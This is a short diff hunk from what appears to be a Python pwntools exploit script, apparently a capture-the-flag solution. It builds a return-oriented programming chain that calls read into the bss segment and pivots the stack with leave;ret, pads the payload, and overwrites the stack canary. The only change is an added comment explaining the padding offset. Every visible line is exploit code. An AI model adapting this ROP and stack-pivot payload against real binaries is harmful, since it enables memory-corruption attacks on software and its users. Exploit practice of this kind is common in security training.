@@ -21,7 +21,7 @@ payload += p64(pop_rdi) + p64(0)						# rdi = 0
 payload += p64(pop_rsi_r15) + p64(bss_addr) + p64(0)	# rsi = bss_addr
 payload += p64(elf.plt['read'])							# read(0, bss_addr,)
 payload += p64(leave_ret)				# mov rsp,rbp ; pop rbp ; pop rip
-payload  = payload.ljust(0x17e8, '\x00')
+payload  = payload.ljust(0x17e8, '\x00') # 0x17e8  = 0x1008 + 0x7b8 + 0x28 
 payload += '\x11'*0x8									# canary
 payload  = payload.ljust(0x2000, '\x00')
 
